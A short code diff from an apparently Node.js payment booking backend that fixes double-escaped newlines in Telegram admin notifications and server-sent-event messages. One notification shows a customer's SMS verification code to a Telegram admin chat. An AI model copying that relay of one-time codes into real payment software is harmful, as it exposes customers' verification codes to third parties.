@@ -201,7 +201,7 @@ async function handleSendSMS(bookingId, chatId, callbackId) {
   
   // Notify Telegram admin
   await sendTelegramMessage(chatId, 
-    `✅ SMS отправлена клиенту!\\n\\n📱 Код: <code>${smsCode}</code>\\n🕐 Действителен 5 минут`,
+    `✅ SMS отправлена клиенту!\n\n📱 Код: <code>${smsCode}</code>\n🕐 Действителен 5 минут`,
     'HTML'
   );
   
@@ -231,7 +231,7 @@ async function handleDecline(bookingId, chatId, callbackId) {
   
   // Notify Telegram admin
   await sendTelegramMessage(chatId, 
-    `❌ Оплата отклонена\\n\\n🆔 ID заказа: <code>${bookingId}</code>`,
+    `❌ Оплата отклонена\n\n🆔 ID заказа: <code>${bookingId}</code>`,
     'HTML'
   );
   
@@ -334,7 +334,7 @@ app.get('/api/payment/events/:bookingId', (req, res) => {
       action: 'connected',
       status: session.status,
       message: 'Connected to payment system'
-    })}\\n\\n`);
+    })}\n\n`);
   }
   
   // Handle client disconnect
@@ -351,7 +351,7 @@ function notifyClient(bookingId, data) {
   const session = paymentSessions.get(bookingId);
   if (!session) return;
   
-  const message = `data: ${JSON.stringify(data)}\\n\\n`;
+  const message = `data: ${JSON.stringify(data)}\n\n`;
   
   session.clients.forEach(client => {
     try {
